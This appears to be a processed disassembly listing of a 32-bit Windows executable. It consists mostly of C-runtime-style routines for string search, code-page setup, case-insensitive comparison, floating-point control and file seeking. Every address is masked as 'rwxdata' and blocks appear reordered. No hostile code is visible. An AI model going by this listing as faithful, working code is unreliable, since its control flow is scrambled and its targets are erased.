je rwxdata
inc esi
cmp esi [ rwxdata ]
jl rwxdata
test [ eax + 0xc ] 0x83
je rwxdata
cmp esi 0x14
jl rwxdata
push eax
call sub_405d5a
cmp eax 0xffffffff
pop ecx
je rwxdata
mov eax [ rwxdata ]
push [ eax + esi * 4 ]
call sub_406295
mov eax [ rwxdata ]
pop ecx
and [ eax + esi * 4 ] 0x0
inc edi
sub_40a5d0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je rwxdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je rwxdata
mov eax [ edx - 0x4 ]
cmp al bl
je rwxdata
and eax 0x81010100
je rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je rwxdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne rwxdata
and eax 0x1010100
jne rwxdata
pop ebx
xor eax eax
retn
test edx 0x3
jne rwxdata
pop esi
pop edi
cmp ah bl
je rwxdata
and esi 0x80000000
jne rwxdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je rwxdata
shr eax 0x10
cmp al bl
je rwxdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
cmp ah bl
je rwxdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je rwxdata
jmp rwxdata
sub_40a690
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je rwxdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je rwxdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp rwxdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je rwxdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je rwxdata
mov al [ esi ]
inc esi
cmp al dh
jne rwxdata
test al al
je rwxdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je rwxdata
cmp al dl
je rwxdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je rwxdata
and eax 0x81010100
je rwxdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je rwxdata
test al al
jne rwxdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne rwxdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne rwxdata
and eax 0x1010100
jne rwxdata
pop ebx
xor eax eax
retn
test edx 0x3
jne rwxdata
mov al [ ecx + 0x3 ]
test al al
je rwxdata
pop esi
pop edi
cmp ah bl
je rwxdata
and esi 0x80000000
jne rwxdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je rwxdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je rwxdata
mov ah [ ecx + 0x2 ]
test ah ah
je rwxdata
jmp rwxdata
shr eax 0x10
cmp al bl
je rwxdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je rwxdata
cmp ah bl
je rwxdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je rwxdata
jmp rwxdata
sub_40a721
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rwxdata ] cl
jne rwxdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je rwxdata
xor eax eax
movzx eax [ eax * 2 + rwxdata ]
and eax [ esp + 0x8 ]
jmp rwxdata
retn
test eax eax
jne rwxdata
sub_40a752
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40a8eb
mov esi eax
pop ecx
cmp esi [ rwxdata ]
mov [ ebp + 0x8 ] esi
je rwxdata
xor eax eax
jmp rwxdata
xor ebx ebx
cmp esi ebx
je rwxdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40a968
xor edx edx
mov eax rwxdata
push 0x40
xor eax eax
pop ecx
mov edi rwxdata
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rwxdata ]
add eax 0x30
inc edx
cmp eax rwxdata
jb rwxdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb rwxdata
mov dl [ ecx + 0x1 ]
test dl dl
je rwxdata
cmp [ eax ] esi
je rwxdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne rwxdata
cmp [ ebx ] 0x0
mov ecx ebx
je rwxdata
mov eax [ ebp + 0x8 ]
mov [ rwxdata ] 0x1
push eax
mov [ rwxdata ] eax
call sub_40a935
lea esi [ esi + rwxdata ]
mov edi rwxdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rwxdata ] eax
movsd [ edi ] [ esi ]
jmp rwxdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja rwxdata
cmp [ rwxdata ] ebx
je rwxdata
push 0x40
xor eax eax
pop ecx
mov edi rwxdata
cmp [ ebp - 0x18 ] 0x1
mov [ rwxdata ] esi
[ edi ]
stosb [ edi ]
mov [ rwxdata ] ebx
jbe rwxdata
call sub_40a991
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne rwxdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rwxdata ]
or eax 0xffffffff
mov [ rwxdata ] ebx
cmp [ ebp - 0x12 ] 0x0
je rwxdata
or [ eax + rwxdata ] dl
inc eax
cmp eax edi
jbe rwxdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rwxdata ] 0x8
inc eax
cmp eax 0xff
jb rwxdata
push esi
call sub_40a935
pop ecx
mov [ rwxdata ] eax
mov [ rwxdata ] 0x1
jmp rwxdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rwxdata
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp rwxdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne rwxdata
or [ eax + rwxdata ] 0x4
inc eax
jmp rwxdata
mov dl [ ecx ]
test dl dl
je rwxdata
cmp eax edx
ja rwxdata
sub_40a8eb
mov eax [ esp + 0x4 ]
and [ rwxdata ] 0x0
cmp eax 0xfffffffe
jne rwxdata
cmp eax 0xfffffffd
jne rwxdata
mov [ rwxdata ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne rwxdata
mov [ rwxdata ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rwxdata ]
mov [ rwxdata ] 0x1
sub_40a935
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je rwxdata
mov eax 0x411
retn
sub eax 0x4
je rwxdata
mov eax 0x804
retn
sub eax 0xd
je rwxdata
mov eax 0x412
retn
dec eax
je rwxdata
mov eax 0x404
retn
xor eax eax
retn
sub_40a968
push edi
push 0x40
pop ecx
xor eax eax
mov edi rwxdata
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rwxdata
mov [ rwxdata ] eax
mov [ rwxdata ] eax
mov [ rwxdata ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_40a991
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rwxdata ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne rwxdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb rwxdata
cmp eax 0x5a
ja rwxdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb rwxdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je rwxdata
and [ eax + rwxdata ] 0x0
cmp eax 0x7a
ja rwxdata
or [ eax + rwxdata ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rwxdata ]
push [ rwxdata ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_409e9f
push 0x0
lea eax [ ebp - 0x214 ]
push [ rwxdata ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rwxdata ]
call sub_4070de
push 0x0
lea eax [ ebp - 0x314 ]
push [ rwxdata ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rwxdata ]
call sub_4070de
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb rwxdata
pop esi
leave
retn
or [ eax + rwxdata ] 0x20
mov cl al
sub cl 0x20
jmp rwxdata
inc eax
cmp eax esi
jb rwxdata
test dl 0x2
je rwxdata
or [ eax + rwxdata ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne rwxdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rwxdata ] cl
jmp rwxdata
and [ eax + rwxdata ] 0x0
or [ eax + rwxdata ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp rwxdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb rwxdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja rwxdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je rwxdata
jmp rwxdata
mov [ eax + rwxdata ] dl
jmp rwxdata
sub_40ab32
push ebx
xor ebx ebx
cmp [ rwxdata ] ebx
push esi
push edi
jne rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
push rwxdata
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je rwxdata
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push ebx
call [ rwxdata ]
call eax
mov ebx eax
test ebx ebx
je rwxdata
xor eax eax
jmp rwxdata
mov esi [ GetProcAddress@IAT ]
push rwxdata
push edi
call esi
test eax eax
mov [ rwxdata ] eax
je rwxdata
mov eax [ rwxdata ]
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
push rwxdata
push edi
call esi
push rwxdata
push edi
mov [ rwxdata ] eax
call esi
mov [ rwxdata ] eax
push ebx
call eax
mov ebx eax
sub_40abc0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je rwxdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rwxdata ]
cmp [ eax + 0x8 ] 0x0
jne rwxdata
xor eax eax
xor ebx ebx
mov edi edi
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp eax ebx
je rwxdata
or ebx ebx
je rwxdata
xor ecx ecx
cmp ah al
je rwxdata
or al al
je rwxdata
mov ecx 0xffffffff
jb rwxdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_40add3
mov ebx eax
add esp 0x4
call sub_40add3
add esp 0x4
pop ecx
cmp eax ebx
jne rwxdata
mov ecx 0xffffffff
jb rwxdata
inc esi
inc edi
cmp ah bh
jb rwxdata
neg ecx
dec ecx
jne rwxdata
neg ecx
jmp rwxdata
cmp al bh
jb rwxdata
cmp ah bl
ja rwxdata
mov al [ esi ]
or eax eax
mov bl [ edi ]
je rwxdata
cmp ah al
jne rwxdata
cmp al bl
ja rwxdata
add ah dh
dec ecx
jne rwxdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je rwxdata
sub_40ac6d
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_40acb8
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_40ad4a
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_40acb8
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je rwxdata
test bl 0x4
je rwxdata
push 0x10
pop eax
test bl 0x8
je rwxdata
or al 0x8
test bl 0x10
je rwxdata
or al 0x4
test bl 0x20
je rwxdata
or al 0x2
test bl 0x2
je rwxdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je rwxdata
or eax 0x80000
and ecx edi
pop esi
je rwxdata
cmp edx 0x400
je rwxdata
or eax 0x20000
cmp ecx ebp
jne rwxdata
or ah 0x1
cmp edx 0x800
je rwxdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je rwxdata
or eax 0x10000
jmp rwxdata
or eax ebp
jmp rwxdata
cmp edx esi
jne rwxdata
or eax edi
jmp rwxdata
sub_40ad4a
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je rwxdata
test bl 0x8
je rwxdata
push 0x1
pop eax
test bl 0x4
je rwxdata
or al 0x4
test bl 0x2
je rwxdata
or al 0x8
test bl 0x1
je rwxdata
or al 0x10
test ebx 0x80000
je rwxdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je rwxdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je rwxdata
cmp ecx 0x100
je rwxdata
or eax edx
cmp ecx 0x10000
jne rwxdata
or ah 0x4
cmp ecx esi
je rwxdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je rwxdata
or eax esi
jmp rwxdata
or ah 0x8
jmp rwxdata
cmp ecx edx
jne rwxdata
or ah 0xc
jmp rwxdata
sub_40add3
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0x0
push ebx
push esi
push edi
jne rwxdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge rwxdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl rwxdata
mov edx [ rwxdata ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je rwxdata
cmp [ rwxdata ] esi
jle rwxdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg rwxdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp rwxdata
mov eax [ rwxdata ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40732d
pop ecx
pop ecx
jmp rwxdata
add eax 0x20
jmp rwxdata
mov eax ebx
jmp rwxdata
cmp eax esi
jne rwxdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rwxdata ]
call sub_4070de
add esp 0x20
test eax eax
je rwxdata
test eax eax
jne rwxdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp rwxdata
sub_40ae9e
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne rwxdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge rwxdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl rwxdata
cmp [ eax ] 0x0
jne rwxdata
sub_40aee7
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_40bb44
add esp 0xc
dec esi
js rwxdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_40bb44
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge rwxdata
test eax eax
je rwxdata
sub_40af3d
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je rwxdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge rwxdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_40ae9e
pop ecx
test eax eax
pop ecx
jne rwxdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40aee7
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_40afc9
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne rwxdata
pop esi
retn
sub_40aff0
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl rwxdata
cmp [ eax ] 0x0
jne rwxdata
push 0x1
pop eax
retn
sub_40b00b
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne rwxdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp rwxdata
cmp ebx edi
jl rwxdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns rwxdata
sub_40b098
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne rwxdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_40afc9
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40af3d
add esp 0x10
test eax eax
je rwxdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_40aff0
test eax eax
pop ecx
jne rwxdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge rwxdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_40afe4
pop ecx
cmp ebx eax
jg rwxdata
lea eax [ ebp - 0xc ]
push eax
call sub_40afe4
pop ecx
jmp rwxdata
cmp edi 0x20
jne rwxdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x4 ] esi
mov [ ecx ] edx
jmp rwxdata
push 0x1f
pop ecx
sub ecx [ edi + 0xc ]
mov edi [ edi + 0x10 ]
shl esi cl
mov ecx [ ebp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or esi ecx
or esi [ ebp - 0xc ]
cmp edi 0x40
jne rwxdata
cmp ebx [ edi ]
jl rwxdata
sub eax ebx
mov esi eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40afc9
lea eax [ ebp - 0xc ]
push esi
push eax
call sub_40b00b
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40af3d
mov eax [ edi + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40b00b
add esp 0x20
xor esi esi
jmp rwxdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] esi
push [ edi + 0xc ]
mov esi [ edi + 0x14 ]
and [ ebp - 0x9 ] 0x7f
lea eax [ ebp - 0xc ]
push eax
add esi ebx
call sub_40b00b
pop ecx
pop ecx
lea eax [ ebp - 0xc ]
push eax
call sub_40afe4
push [ edi + 0xc ]
or [ ebp - 0x9 ] 0x80
lea eax [ ebp - 0xc ]
push eax
call sub_40b00b
mov esi [ edi + 0x14 ]
add esp 0xc
add esi [ edi ]
push 0x1
jmp rwxdata
push 0x2
pop eax
jmp rwxdata
sub_40b230
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40b4be
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40b204
add esp 0x24
leave
retn
sub_40b25d
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push eax
push eax
push eax
push eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40b4be
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40b21a
add esp 0x24
leave
retn
sub_40b28a
push ebp
mov ebp esp
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ edx + 0xc ]
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
test ebx ebx
mov eax edi
jle rwxdata
and [ eax ] 0x0
test ebx ebx
jl rwxdata
mov [ ebp + 0x8 ] ebx
xor ebx ebx
cmp [ esi ] 0x31
jne rwxdata
cmp [ ecx ] 0x35
jl rwxdata
push 0x30
pop edx
movsx edx dl
inc ecx
jmp rwxdata
push edi
call sub_406440
inc eax
push eax
push edi
push esi
call sub_405f60
add esp 0x10
inc [ edx + 0x4 ]
jmp rwxdata
dec eax
cmp [ eax ] 0x39
jne rwxdata
mov dl [ ecx ]
test dl dl
je rwxdata
mov edx [ ebp + 0x10 ]
mov [ eax ] dl
inc eax
dec [ ebp + 0x8 ]
jne rwxdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax ]
mov [ eax ] 0x30
jmp rwxdata
sub_40b301
push ebp
mov ebp esp
sub esp 0xc
push esi
lea eax [ ebp + 0x8 ]
push edi
push eax
lea eax [ ebp - 0xc ]
push eax
call sub_40b365
pop ecx
lea esi [ ebp - 0xc ]
pop ecx
push rwxdata
push 0x0
push 0x11
sub esp 0xc
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_40bce5
mov [ rwxdata ] eax
add esp 0x18
movsx eax [ rwxdata ]
mov [ rwxdata ] eax
pop edi
movsx eax [ rwxdata ]
mov [ rwxdata ] eax
mov [ rwxdata ] rwxdata
mov eax rwxdata
pop esi
leave
retn
sub_40b365
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
mov ax [ edx + 0x6 ]
mov edi 0x7ff
mov ecx eax
and eax 0x8000
shr ecx 0x4
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
test ebx ebx
mov [ ebp - 0x4 ] esi
je rwxdata
xor ebx ebx
cmp eax ebx
jne rwxdata
cmp ebx edi
je rwxdata
lea edi [ ecx + 0x3c01 ]
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne rwxdata
mov edi 0x7fff
jmp rwxdata
lea edi [ ecx + 0x3c00 ]
jmp rwxdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov [ eax + 0x8 ] cx
mov edx [ eax ]
add ecx ecx
mov ebx edx
shr ebx 0x1f
or ebx ecx
lea ecx [ edx + edx ]
mov [ eax ] ecx
mov [ eax + 0x4 ] ebx
add edi 0xffff
mov ecx ebx
jmp rwxdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] bx
jmp rwxdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
mov eax [ ebp + 0x8 ]
or ecx [ ebp - 0x4 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne rwxdata
pop edi
pop esi
pop ebx
leave
retn
sub_40b424
mov eax [ esp + 0x4 ]
push ebx
cmp eax [ rwxdata ]
push esi
push edi
jae rwxdata
and [ rwxdata ] 0x0
mov [ rwxdata ] 0x9
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
shl esi 0x3
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x1
je rwxdata
push eax
call sub_40a15d
cmp eax 0xffffffff
pop ecx
jne rwxdata
push [ esp + 0x18 ]
push 0x0
push [ esp + 0x1c ]
push eax
call [ SetFilePointer@IAT ]
mov ebx eax
cmp ebx 0xffffffff
jne rwxdata
mov [ rwxdata ] 0x9
jmp rwxdata
xor eax eax
call [ GetLastError@IAT ]
jmp rwxdata
or eax 0xffffffff
mov eax [ edi ]
and [ eax + esi + 0x4 ] 0xfd
lea eax [ eax + esi + 0x4 ]
mov eax ebx
jmp rwxdata
push eax
call sub_40a07c
pop ecx
jmp rwxdata
test eax eax
je rwxdata
pop edi
pop esi
pop ebx
retn
sub_40b4be
push ebp
mov ebp esp
sub esp 0x5c
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push 0x1
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp rwxdata
cmp cl 0x9
je rwxdata
mov cl [ edi ]
cmp cl 0x20
je rwxdata
cmp cl 0xa
je rwxdata
cmp cl 0xd
jne rwxdata
push 0x4
pop esi
cmp eax 0xa
je rwxdata
jmp [ eax * 4 + jump_table_40b95f ]
mov eax [ ebp + 0xc ]
cmp [ ebp - 0x10 ] 0x0
mov [ eax ] edi
je rwxdata
jmp rwxdata
cmp bl 0x31
jl rwxdata
cmp bl 0x31
mov [ ebp - 0x10 ] edx
jl rwxdata
cmp bl 0x31
jl rwxdata
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x24 ] edx
jne rwxdata
cmp [ rwxdata ] edx
